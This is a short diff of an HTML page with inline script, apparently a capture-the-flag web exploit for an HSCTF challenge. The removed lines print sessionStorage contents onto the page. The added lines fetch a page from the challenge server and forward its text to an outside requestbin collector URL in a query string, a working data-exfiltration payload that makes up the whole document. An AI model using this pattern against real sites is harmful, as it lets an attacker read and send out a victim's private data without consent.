@@ -1,10 +1,9 @@
 <div id="yes">
 </div>
 <script>
-  yes = document.getElementById("yes");
-
-
-Object.keys(sessionStorage).forEach(function(a, b) {
-    yes.innerHTML = yes.innerHTML + a + ":" + Object.values(sessionStorage)[b] + "<br/>"
+fetch("http://web1.hsctf.com:8000/hsgtf").then(function(a) {
+    a.text().then(function(b) {
+        fetch("http://e37v6836467a00h9.b.requestbin.net?uwu="+b)
+    })
 })
 </script>
